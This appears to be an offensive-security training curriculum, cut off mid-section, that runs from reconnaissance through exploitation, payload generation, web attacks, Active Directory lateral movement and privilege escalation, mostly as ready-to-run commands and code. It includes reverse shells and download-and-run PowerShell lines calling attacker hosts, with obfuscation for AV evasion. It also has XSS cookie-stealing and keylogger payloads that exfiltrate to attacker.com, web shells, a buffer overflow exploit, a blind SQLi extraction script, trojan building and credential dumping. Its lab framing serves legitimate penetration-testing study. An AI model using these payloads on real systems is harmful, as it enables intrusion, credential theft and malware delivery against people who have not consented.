
# Minimum setup
- Host OS: Windows/Mac/Linux
- RAM: 16GB+ (8GB minimum)
- Storage: 100GB free
- Virtualization: VirtualBox/VMware

# Install immediately:
1. Kali Linux (VM)
2. Windows 10 VM (for Active Directory later)
3. Metasploitable 2 & 3
4. Docker (for quick vulnerable environments)

# On Kali (comes pre-installed mostly)
sudo apt update && sudo apt upgrade -y

# Core toolkit
sudo apt install -y \
    nmap masscan \
    wireshark tcpdump \
    metasploit-framework \
    burpsuite \
    sqlmap \
    john hashcat \
    hydra medusa \
    nikto dirb gobuster \
    crackmapexec \
    bloodhound neo4j \
    impacket-scripts \
    responder \
    evil-winrm \
    chisel \
    ligolo-ng

# Python environment
python3 -m pip install \
    pwntools \
    scapy \
    impacket \
    requests \
    beautifulsoup4
```

---

## 🗓️ **MONTH 1: Foundations & Reconnaissance**

### **Week 1: Network Fundamentals & Information Gathering**

#### **Day 1-2: TCP/IP Deep Dive**
```
Goal: Understand networking from first principles

Study Topics:
├── OSI Model (actually understand each layer)
├── TCP 3-way handshake (SYN, SYN-ACK, ACK)
├── UDP vs TCP (when/why each is used)
├── IPv4 addressing & subnetting
├── Common ports & their protocols
└── Packet structure (Ethernet, IP, TCP headers)

Practical Exercise:
┌─ Capture traffic with Wireshark
├─ Analyze TCP handshake manually
├─ Identify protocols by packet inspection
└─ Build custom packets with Scapy

# Scapy exercise
from scapy.all import *

# Craft custom SYN packet
ip = IP(dst="10.0.0.1")
tcp = TCP(dport=80, flags="S")
packet = ip/tcp
send(packet)

# Analyze response
response = sr1(packet)
response.show()
```

**Deliverable:** Write a blog post explaining TCP handshake with Wireshark screenshots.

---

#### **Day 3-4: Advanced Port Scanning**
```
Goal: Master reconnaissance techniques

Nmap Mastery:
├── TCP Connect scan (-sT)
├── SYN scan (-sS) - "stealth scan"
├── UDP scan (-sU)
├── Version detection (-sV)
├── OS fingerprinting (-O)
├── NSE scripts (--script)
└── Timing & evasion (-T0 through -T5)

Understanding Scan Types:
┌─ Why SYN scan is "stealthier"
│  └─ Never completes handshake
├─ How firewalls detect scans
│  └─ Rate limiting, pattern detection
└─ Evasion techniques
   ├─ Decoy scanning (-D)
   ├─ Fragmentation (--mtu)
   ├─ Custom timing (--scan-delay)
   └─ Spoofing source port (--source-port)

Hands-on Lab:
# Against your Metasploitable VM

# 1. Basic scan
nmap -p- 192.168.1.100

# 2. Detailed version scan
nmap -sV -sC -p- 192.168.1.100 -oA detailed_scan

# 3. UDP scan (slow but necessary)
sudo nmap -sU --top-ports 100 192.168.1.100

# 4. Aggressive scan (don't use on real targets without permission!)
nmap -A -T4 192.168.1.100

# 5. Stealth scan with timing evasion
sudo nmap -sS -T2 --scan-delay 2s 192.168.1.100

# 6. Firewall evasion
sudo nmap -sS -f --mtu 16 -D RND:10 192.168.1.100
```

**Exercise:** Scan Metasploitable with 10 different techniques. Document what each reveals.

---

#### **Day 5-7: OSINT & Passive Reconnaissance**
```
Goal: Gather intelligence without touching the target

OSINT Framework:
├── Domain enumeration
│   ├── whois lookup
│   ├── DNS records (A, MX, TXT, NS)
│   ├── Subdomain enumeration
│   └── Certificate transparency logs
├── Social media intelligence
│   ├── LinkedIn employee enumeration
│   ├── GitHub leaked credentials
│   └── Pastebin dumps
└── Infrastructure mapping
    ├── Shodan queries
    ├── Censys searches
    └── ASN enumeration

Tools & Techniques:
# DNS enumeration
dig example.com ANY
host -t mx example.com
nslookup -type=txt example.com

# Subdomain discovery
sublist3r -d example.com
amass enum -d example.com

# Certificate transparency
curl "https://crt.sh/?q=%.example.com&output=json" | jq

# Shodan (create free account)
shodan search "org:example"

# GitHub dork
site:github.com "example.com" password
site:github.com "example.com" api_key
```

**Project:** Create an OSINT report on a company (legally - public info only). Include:
- Org chart from LinkedIn
- Technology stack
- Public IP ranges
- Leaked credentials (check HaveIBeenPwned API)
- Attack surface map

---

### **Week 2: Service Enumeration & Vulnerability Assessment**

#### **Day 8-9: Web Application Reconnaissance**
```
Goal: Map web attack surface

Methodology:
├── Technology fingerprinting
│   ├── whatweb, wappalyzer
│   └── HTTP headers analysis
├── Directory bruteforcing
│   ├── gobuster, ffuf, dirsearch
│   └── Custom wordlists
├── Parameter discovery
│   ├── Arjun, ParamSpider
│   └── Archive.org scraping
└── JavaScript analysis
    ├── Extract endpoints from JS files
    └── Find API keys, secrets

Hands-on:
# Technology stack
whatweb http://vulnerable-site.local
curl -I http://vulnerable-site.local

# Directory enumeration
gobuster dir -u http://vulnerable-site.local \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,bak \
    -t 50

# Advanced fuzzing
ffuf -w /path/wordlist.txt \
    -u http://vulnerable-site.local/FUZZ \
    -mc 200,301,302,403 \
    -fc 404

# Find parameters
arjun -u http://vulnerable-site.local/page.php

# JS endpoint extraction
python3 linkfinder.py -i http://vulnerable-site.local -o results.html
```

**Lab:** Set up DVWA, enumerate completely. Find all hidden directories, parameters, and functionalities.

---

#### **Day 10-11: Network Service Enumeration**
```
Goal: Deep-dive into each service

Service-Specific Enumeration:

FTP (21):
├── Anonymous login test
├── Version banner grab
├── Bounce attack test
└── Directory traversal

# FTP enumeration script
nmap -p21 --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor <target>

SSH (22):
├── Banner grabbing (version detection)
├── User enumeration (timing attacks)
├── Supported algorithms
└── Auth methods

# SSH enumeration
nc target 22  # Banner
ssh-audit target

SMB (139, 445):
├── Share enumeration
├── User enumeration
├── Policy information
└── Null session attacks

# SMB enumeration (critical for AD)
enum4linux -a <target>
smbclient -L //<target> -N
smbmap -H <target>
crackmapexec smb <target> --shares

SMTP (25):
├── User enumeration (VRFY, EXPN, RCPT)
├── Open relay test
└── Version detection

# SMTP user enum
smtp-user-enum -M VRFY -U users.txt -t <target>

DNS (53):
├── Zone transfer (AXFR)
├── DNS cache snooping
└── DNS tunneling detection

# Zone transfer
dig axfr @<dns-server> example.com
fierce -dns example.com

HTTP/HTTPS (80, 443):
├── Nikto scan
├── SSL/TLS vulnerabilities
└── Virtual host enumeration

# Web vulnerability scan
nikto -h http://target
testssl.sh https://target

SNMP (161):
├── Community string guessing
├── MIB tree walking
└── Device enumeration

# SNMP enumeration
onesixtyone -c community.txt <target>
snmpwalk -v2c -c public <target>

LDAP (389):
├── Anonymous bind
├── Domain information
└── User enumeration

# LDAP enumeration
ldapsearch -x -h <target> -s base
```

**Exercise:** Create enumeration scripts for each service. Test on Metasploitable.

---

#### **Day 12-14: Vulnerability Scanning & Analysis**
```
Goal: Identify exploitable weaknesses

Vulnerability Assessment:
├── Automated scanning (understand limitations)
├── Manual verification (essential!)
├── CVE research
├── Exploit availability
└── Impact assessment

Tools:
# Nessus (free for home use)
# OpenVAS
# Nuclei (modern, template-based)

nuclei -u http://target -t /path/to/templates

# Nmap vuln scripts
nmap --script vuln <target>

# Specific vulnerability checks
nmap --script smb-vuln-ms17-010 <target>  # EternalBlue
nmap --script http-shellshock <target>
nmap --script ssl-heartbleed <target>

Manual Verification Process:
1. Read CVE details
2. Understand the vulnerability mechanism
3. Check if conditions are met
4. Test proof-of-concept safely
5. Document findings

Research Workflow:
# Find exploits for a service
searchsploit <service name> <version>

# Get exploit details
searchsploit -x <exploit-id>

# Search online databases
- exploit-db.com
- nvd.nist.gov
- cve.mitre.org
- github.com (POC exploits)
```

**Project:** Full vulnerability assessment of Metasploitable:
1. Automated scan (Nessus/OpenVAS)
2. Manual verification of top 10 findings
3. Research exploits for each
4. Write professional report

---

### **Week 3: Exploitation Fundamentals**

#### **Day 15-17: Metasploit Framework**
```
Goal: Master the industry-standard exploitation framework

Metasploit Architecture:
├── Modules
│   ├── Exploits
│   ├── Payloads
│   ├── Auxiliary
│   ├── Post
│   └── Encoders
├── Databases (PostgreSQL)
└── Workspaces

MSF Console Mastery:
msfconsole

# Workspace management
workspace -a project_name
workspace project_name

# Database integration
db_status
db_nmap -sV -p- 192.168.1.100
hosts
services
vulns

# Search and select modules
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor

# Configure exploit
show options
set RHOSTS 192.168.1.100
set RHOST 192.168.1.100
show payloads
set PAYLOAD cmd/unix/interact

# Run exploit
check  # Test if target is vulnerable
exploit
# or
run

# Meterpreter commands (if using meterpreter payload)
sysinfo
getuid
ps
migrate <pid>
hashdump
screenshot
keyscan_start
keyscan_dump

Common Exploit Workflows:

# 1. SMB Exploitation (EternalBlue)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# 2. Web Application Exploitation
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS target.com
set RHOST target.com
exploit

# 3. Post-Exploitation Modules
use post/windows/gather/hashdump
set SESSION 1
run

# 4. Port Forwarding (Pivoting)
portfwd add -l 3389 -p 3389 -r 10.10.10.5
```

**Lab Exercises:**
1. Exploit vsftpd backdoor on Metasploitable
2. Exploit Samba on Metasploitable
3. Exploit UnrealIRCd backdoor
4. Practice post-exploitation modules

---

#### **Day 18-19: Manual Exploitation (No Metasploit)**
```
Goal: Understand exploitation at a deeper level

Manual Exploitation Process:
├── Understand the vulnerability
├── Find or write exploit code
├── Modify for target environment
├── Generate custom payload
├── Deliver exploit
└── Catch shell

Example: Buffer Overflow Basics

# Generate pattern (for offset calculation)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6A413969

# Generate shellcode
msfvenom -p linux/x86/shell_reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f python \
    -b "\x00\x0a\x0d"

# Basic Python exploit template
import socket
import struct

target_ip = "192.168.1.100"
target_port = 9999

# Shellcode from msfvenom
shellcode = b""
shellcode += b"\xda\xc1\xba\x4d\x23\x8f\x1c..."

# Build exploit
offset = 524
jmp_esp = struct.pack("<I", 0x625011af)  # Address of JMP ESP
nops = b"\x90" * 16

buffer = b"A" * offset
buffer += jmp_esp
buffer += nops
buffer += shellcode

# Send exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(buffer)
s.close()

Web Exploitation Without Tools:

# SQL Injection (manual)
# Test for SQLi
' OR '1'='1
1' OR '1'='1'--
1' UNION SELECT NULL,NULL--

# Extract database
1' UNION SELECT table_name,NULL FROM information_schema.tables--
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
1' UNION SELECT username,password FROM users--

# Command Injection (manual)
; whoami
| whoami
`whoami`
$(whoami)
& whoami &
&& whoami &&

# XXE (XML External Entity)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <name>&xxe;</name>
</root>
```

**Challenge:** Exploit 3 services on Metasploitable manually (no Metasploit modules). Write your own Python exploits.

---

#### **Day 20-21: Payload Generation & Evasion**
```
Goal: Create custom payloads that bypass defenses

Msfvenom Mastery:
# List payloads
msfvenom -l payloads | grep windows

# Basic Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f exe \
    -o payload.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f elf \
    -o payload.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -f raw \
    -o shell.php

# Encoded payload (bypass AV)
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -e x86/shikata_ga_nai \
    -i 10 \
    -f exe \
    -o encoded_payload.exe

# Embedding in legitimate binary
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -x /path/to/legitimate.exe \
    -k \
    -f exe \
    -o trojan.exe

AV Evasion Techniques:
├── Encoding (shikata_ga_nai)
├── Encryption
├── Obfuscation
├── In-memory execution
├── Process injection
└── Custom payload development

# Basic obfuscation example
# Original PowerShell
powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Obfuscated
powershell -eP bYpAsS -c "IeX(NeW-oBjEcT nEt.WeBcLiEnT).DoWnLoAdStRiNg('http://attacker.com/payload.ps1')"

# Base64 encoded
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

Listener Setup:
# Netcat listener
nc -lvnp 4444

# Meterpreter handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit"
```

**Exercise:** 
1. Create 5 different payload types
2. Test on your Windows VM
3. Practice evasion techniques
4. Set up handlers for each payload type

---

### **Week 4: Web Application Exploitation**

#### **Day 22-24: SQL Injection**
```
Goal: Master database exploitation

SQL Injection Types:
├── Error-based
├── Union-based
├── Blind (Boolean-based)
├── Time-based blind
└── Out-of-band

Understanding SQL Injection from First Principles:

Problem: User input is concatenated into SQL query
Fundamental Truth: SQL interprets special characters
Attack Logic: Inject SQL syntax to manipulate query

# Vulnerable code example
query = "SELECT * FROM users WHERE username='" + user_input + "' AND password='" + password + "'"

# If user_input = admin' --
# Query becomes:
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
# Everything after -- is commented out

Manual SQL Injection:

# 1. Detection
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--

# 2. Determine number of columns (Union-based)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# Continue until error (tells you column count)

# 3. Find injectable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a','b','c'--

# 4. Extract database information (MySQL)
' UNION SELECT NULL,database(),NULL--
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,user(),NULL--

# 5. Enumerate tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

# 6. Enumerate columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# 7. Extract data
' UNION SELECT NULL,username,password FROM users--

# 8. Reading files (MySQL)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--

# 9. Writing files (if FILE privilege)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--

Blind SQL Injection (Boolean-based):

# Time-based detection
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('test'))--

# Extract data one character at a time
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

# Automate with Python
import requests
import string

url = "http://vulnerable.com/login.php"
charset = string.ascii_lowercase + string.digits

password = ""
for position in range(1, 33):  # Assuming 32-char hash
    for char in charset:
        payload = f"admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}'--"
        data = {"username": payload, "password": "anything"}
        response = requests.post(url, data=data)
        
        if "Welcome" in response.text:  # Successful login indicator
            password += char
            print(f"[+] Character {position}: {char}")
            break

print(f"[+] Password: {password}")

SQLMap Automation:

# Basic scan
sqlmap -u "http://vulnerable.com/page.php?id=1"

# Specify parameter
sqlmap -u "http://vulnerable.com/page.php" --data="id=1&name=test" -p id

# Enumerate databases
sqlmap -u "http://vulnerable.com/page.php?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "http://vulnerable.com/page.php?id=1" -D database_name --tables

# Dump specific table
sqlmap -u "http://vulnerable.com/page.php?id=1" -D database_name -T users --dump

# Get SQL shell
sqlmap -u "http://vulnerable.com/page.php?id=1" --sql-shell

# Get OS shell (if possible)
sqlmap -u "http://vulnerable.com/page.php?id=1" --os-shell

# Using request file (from Burp)
sqlmap -r request.txt

# Bypassing WAF
sqlmap -u "http://vulnerable.com/page.php?id=1" --tamper=space2comment,between
```

**Lab:**
1. Set up DVWA SQL Injection module
2. Complete all difficulty levels manually
3. Automate extraction with custom Python script
4. Use SQLMap on same challenges
5. Document differences in approach

---

#### **Day 25-26: Cross-Site Scripting (XSS)**
```
Goal: Client-side exploitation mastery

XSS Types:
├── Reflected XSS (non-persistent)
├── Stored XSS (persistent)
└── DOM-based XSS

Understanding XSS from First Principles:

Problem: User input is rendered in HTML without sanitization
Fundamental Truth: Browsers execute JavaScript in HTML
Attack Logic: Inject JavaScript that executes in victim's browser

Basic XSS Payloads:

# Alert box (detection)
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

# Image tag
<img src=x onerror=alert('XSS')>

# SVG
<svg onload=alert('XSS')>

# Body tag
<body onload=alert('XSS')>

# Iframe
<iframe src="javascript:alert('XSS')">

Advanced XSS Attacks:

# Cookie stealing
<script>
fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
</script>

# Keylogger
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log.php?key=' + e.key);
}
</script>

# Session hijacking
<script>
new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

# BeEF Hook (Browser Exploitation Framework)
<script src="http://attacker-ip:3000/hook.js"></script>

XSS Filter Bypass:

# Uppercase bypass
<ScRiPt>alert('XSS')</sCrIpT>

# No script tags
<img src=x onerror=alert('XSS')>

# Encoded
<script>alert(String.fromCharCode(88,83,83))</script>

# Double encoding
%253Cscript%253Ealert('XSS')%253C/script%253E

# Null byte bypass
<script>%00alert('XSS')</script>

# Markdown bypass
[Click](javascript:alert('XSS'))

DOM-Based XSS:

# Vulnerable code
var pos = document.URL.indexOf("name=") + 5;
var name = document.URL.substring(pos, document.URL.length);
document.write(name);

# Exploit
http://vulnerable.com/page.html#name=<script>alert('XSS')</script>

Automated XSS Hunting:

# XSStrike
python3 xsstrike.py -u "http://vulnerable.com/search.php?q=test"

# Dalfox
dalfox url http://vulnerable.com/search.php?q=test

# Manual fuzzing with Burp Intruder
# Use XSS payload lists from SecLists
```

**Lab:**
1. DVWA XSS modules (all levels)
2. Create JavaScript keylogger
3. Set up BeEF and hook a browser
4. Practice filter bypass techniques
5. Write XSS POC report

---

#### **Day 27-28: Command Injection & File Upload**
```
Goal: Achieve remote code execution

Command Injection:

Understanding:
- Application executes system commands with user input
- No proper input sanitization
- Allows arbitrary command execution

Detection:
# Basic tests
; whoami
| whoami
& whoami
&& whoami
|| whoami
` whoami `
$( whoami )

# URL encoded
%3B whoami
%7C whoami
%26 whoami

# With newline
%0a whoami

Exploitation:
# Reverse shell (Linux)
; bash -i >& /dev/tcp/attacker-ip/4444 0>&1
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip 4444 >/tmp/f

# Reverse shell (Windows)
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# Data exfiltration
; cat /etc/passwd | nc attacker-ip 4444
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)

# Blind command injection (check with DNS)
; nslookup $(whoami).attacker.com

File Upload Vulnerabilities:

Understanding:
- Applications allow file uploads
- Insufficient validation
- Uploaded files are accessible and executable

Bypass Techniques:

# 1. Extension bypass
shell.php
shell.php.jpg (double extension)
shell.php%00.jpg (null byte)
shell.php%0a.jpg (newline)
shell.php..... (trailing dots - Windows)
shell.php::$DATA (NTFS alternate data stream)

# 2. MIME type bypass
Content-Type: image/jpeg
(but file is actually PHP)

# 3. Magic bytes bypass
# Add JPEG header to PHP file
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

# 4. Case sensitivity
shell.PhP
shell.pHp

Web Shells:

# Simple PHP shell
<?php system($_GET['cmd']); ?>

# More advanced
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

# Python web shell (Flask)
from flask import Flask, request
import subprocess
app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd', 'whoami')
    result = subprocess.check_output(cmd, shell=True)
    return result

# One-liner web shells
# PHP
<?php @eval($_POST['cmd']);?>
<?=`$_GET[0]`?>

# ASP
<%eval request("cmd")%>

# JSP
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
```

**Lab:**
1. DVWA Command Injection (all levels)
2. DVWA File Upload (all levels)
3. Upload web shell to vulnerable server
4. Practice various bypass techniques
5. Achieve RCE through different methods

---

## 🗓️ **MONTH 2: Advanced Exploitation & Post-Exploitation**

### **Week 5: Windows Exploitation**

#### **Day 29-31: Active Directory Reconnaissance**
```
Goal: Map out Windows domain environment

AD Enumeration from Linux:

# Initial scan
nmap -p389,636,3268,3269,88,135,139,445 <dc-ip>

# LDAP enumeration
ldapsearch -x -h <dc-ip> -s base namingcontexts
ldapsearch -x -h <dc-ip> -b "DC=domain,DC=local"

# SMB enumeration
enum4linux -a <dc-ip>
smbclient -L //<dc-ip> -N
smbmap -H <dc-ip>

# Kerberos enumeration
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt <dc-ip>

AD Enumeration from Windows (compromised host):

# PowerView (PowerSploit)
Import-Module .\PowerView.ps1

# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser
Get-DomainUser -Identity administrator
Get-DomainUser -Properties samaccountname,description

# Computer enumeration
Get-DomainComputer
Get-DomainComputer -Properties name,operatingsystem

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# Find shares
Find-DomainShare -CheckShareAccess

# Find interesting ACLs
Find-InterestingDomainAcl

# BloodHound data collection
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Native Windows commands
net user /domain
net group /domain
net group "Domain Admins" /domain
net accounts /domain

# PowerShell AD module
Get-ADUser -Filter *
Get-ADComputer -Filter *
Get-ADGroup -Filter *

Responder Attack (LLMNR/NBT-NS Poisoning):

# On Kali
sudo responder -I eth0 -wrf

# Wait for authentication attempts
# Crack captured hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 5600 hashes.txt rockyou.txt
```

**Lab:**
1. Set up Windows Server + Windows 10 as AD environment
2. Run full enumeration from Linux
3. Compromise one machine, run PowerView
4. Collect BloodHound data
5. Analyze attack paths in BloodHound GUI

---

#### **Day 32-34: Pass-the-Hash & Lateral Movement**
```
Goal: Move laterally across Windows network

Pass-the-Hash (PtH):

Understanding:
- NTLM authentication uses hash, not plaintext password
- If you have the hash, you can authenticate
- No need to crack the password

Obtaining Hashes:

# Mimikatz (on compromised Windows)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets

# Dump SAM database
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
# Extract hashes with secretsdump.py

# From memory (Linux with compromised credentials)
crackmapexec smb <target-ip> -u username -p password --sam
crackmapexec smb <target-ip> -u username -p password --lsa

Using Hashes:

# CrackMapExec
crackmapexec smb <target-ip> -u username -H <ntlm-hash>
crackmapexec smb <target-ip> -u username -H <ntlm-hash> -x "whoami"

# Impacket psexec.py
psexec.py domain/username@<target-ip> -hashes :<ntlm-hash>

# Impacket smbexec.py
smbexec.py domain/username@<target-ip> -hashes :<ntlm-hash>

# Impacket wmiexec.py
wmiexec.py domain/username@<target-ip> -hashes :<ntlm-hash>

# Evil-WinRM
evil-winrm -i <target-ip> -u username -H <ntlm-hash>

Kerberoasting:

# Request service tickets
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# Or with Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack offline
hashcat -m 13100 hashes.txt rockyou.txt

AS-REP Roasting:

# Find users without Kerberos pre-authentication
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired

# Request AS-REP
# With Rubeus
Rubeus.exe asreproast /outfile:hashes.txt

# With Impacket
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt

Token Impersonation:

# Meterpreter
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# Empire
usemodule privesc/getsystem
usemodule credentials/tokens

Pivoting & Port Forwarding:

# Meterpreter
portfwd add -l 3389 -p 3389 -r 10.10.10.5

# SSH tunnel
ssh -L 3389:internal-host:3389 user@compromised-host

# Chisel
# On attacker (server)
./chisel server -p 8000 --reverse

# On compromised host (client)
./chisel client attacker-ip:8000 R:3389:internal-host:3389

# Ligolo-ng (modern, better than chisel)
# On attacker
./ligolo-ng -selfcert

# On compromised host
./agent -connect attacker-ip:11601
```

**Lab:**
1. Dump hashes from Windows machine
2. Pass-the-hash to another system
3. Kerberoast service accounts
4. Set up pivot through compromised host
5. Access internal system via tunnel

---

#### **Day 35: Privilege Escalation (Windows)**
```
Goal: Gain SYSTEM/Administrator access

Automated Enumeration:

# WinPEAS
winpeas.exe

# PowerUp (PowerSploit)
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Privesc check
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

Common Privilege Escalation Vectors:

# 1. Unquoted Service Paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Exploit
# If service path is: C:\Program Files\Vulnerable Service\service.exe
# Place malicious exe at: C:\Program.exe

# 2. Weak Service Permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *

# If writable, replace service binary
sc config <service> binPath= "C:\path\to\reverse_shell.exe"
sc stop <service>
sc start <service>

# 3. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, MSI files run as SYSTEM
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# 4. Scheduled Tasks
schtasks /query /fo LIST /v

# Check task executable permissions
icacls "C:\path\to\task_executable.exe"

# 5. Stored Credentials
cmdkey /list
runas /savecred /user:Administrator reverse_shell.exe

# Search for passwords in files
findstr /si password *.txt *.xml *.ini *.config

# 6. DLL Hijacking
# Identify missing DLLs
# Use Process Monitor

# 7. Kernel Exploits
systeminfo
# Check against Windows Exploit Suggester

# Watson (automated kernel exploit finder)
Watson.exe

Potato Attacks (Token Manipulation):

# JuicyPotato (Windows < 10 v1809)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c reverse_shell.exe" -t *

# RoguePotato (newer Windows)
RoguePotato.exe -r <attacker-ip> -e "reverse_shell.exe" -l 9999
```

**Lab:**
1. Enumerate Windows 10 VM with WinPEAS
2. Identify 3 privilege escalation vectors
3. Exploit unquoted service path
4. Exploit AlwaysInstallElevated
5. Use JuicyPotato/RoguePotato

---

### **Week 6: Linux Exploitation & Privilege Escalation**

#### **Day 36-37: Linux Service Exploitation**
```
Goal: Exploit common Linux services

SSH Exploitation:

# User enumeration (timing attack)
# Use tool like osueta

# Brute force
hydra -L users.txt -P passwords.txt ssh://<target-ip>
medusa -h <target-ip> -U users.txt -P passwords.txt -M ssh

# SSH key authentication bypass
# If .ssh directory is writable
echo "your-public-key" >> /home/user/.ssh/authorized_keys

NFS Exploitation:

# Enumerate NFS shares
showmount -e <target-ip>
nmap -p111 --script nfs-* <target-ip>

# Mount share
mkdir /tmp/nfs
mount -t nfs <target-ip>:/share /tmp/nfs

# If no_root_squash is enabled, create SUID binary
# On attacker machine (as root)
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target (as low-priv user)
/share/bash -p  # Now root

Apache/Nginx Exploitation:

# Directory traversal
http://target/../../../../etc/passwd
http://target/..%2F..%2F..%2F..%2Fetc%2Fpasswd

# Server-Side Includes (SSI) Injection
<!--#exec cmd="whoami"-->

# PHP-FPM exploitation
# If misconfigured, can lead to RCE

MySQL Exploitation:

# UDF exploitation
# User-Defined Functions can execute system commands

# 1. Log into MySQL
mysql -u root -p

# 2. Create malicious UDF
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

# 3. Create function
create function do_system returns integer soname 'raptor_udf2.so';

# 4. Execute commands
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```

**Lab:**
1. Exploit Metasploitable services
2. Practice NFS exploitation
3. MySQL UDF privilege escalation
4. Directory traversal exploitation

---

#### **Day 38-40: Linux Privilege Escalation**
```
Goal: Escalate from low-privilege to root

Automated Enumeration:

# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh -l 2

# Linux Exploit Suggester
./linux-exploit-suggester.sh

Manual Enumeration:

# System information
uname -a
cat /etc/issue
cat /etc/*-release

# User information
id
whoami
groups
sudo -l

# Other users
cat /etc/passwd
cat /etc/shadow  # If readable

# Network
ifconfig
ip a
netstat -antup
ss -tunlp

# Running processes
ps aux
ps -ef

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Writable files/directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

Common Privilege Escalation Vectors:

# 1. SUDO exploitation
sudo -l

